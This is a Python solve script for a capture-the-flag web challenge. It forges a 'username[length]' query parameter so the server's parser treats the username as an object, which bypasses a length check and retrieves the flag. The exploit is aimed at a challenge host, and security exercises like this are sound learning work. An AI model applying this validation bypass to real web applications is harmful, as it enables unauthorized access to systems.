#!/usr/bin/env python3
# Bypass the Big Chungus username length check by spoofing the username[length] query parameter.

from __future__ import annotations

import re
import urllib.parse
import urllib.request

BASE_URL = "https://big-chungus.challs.pwnoh.io/"
MIN_THRESHOLD = 47_626_626_725  # 0xB16_C4A6A5


# Build the request URL with manipulated query parameters to satisfy the length check.
def build_url() -> str:
    spoofed_length = MIN_THRESHOLD + 10
    params = [
        ("username[length]", str(spoofed_length)),
        ("username", "test-user"),
    ]
    query = urllib.parse.urlencode(params)
    return f"{BASE_URL}?{query}"


# Send the crafted request and print any leaked flag.
def main() -> int:
    url = build_url()
    req = urllib.request.Request(url, headers={"User-Agent": "chungus-bot/1.0"})
    with urllib.request.urlopen(req, timeout=10) as resp:
        body = resp.read().decode("utf-8", errors="replace")
    print(f"Request URL: {url}")
    match = re.search(r"bctf\{[^}]+\}", body)
    if match:
        print(f"Flag found: {match.group(0)}")
    else:
        print("Response (no flag detected):")
        print(body)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
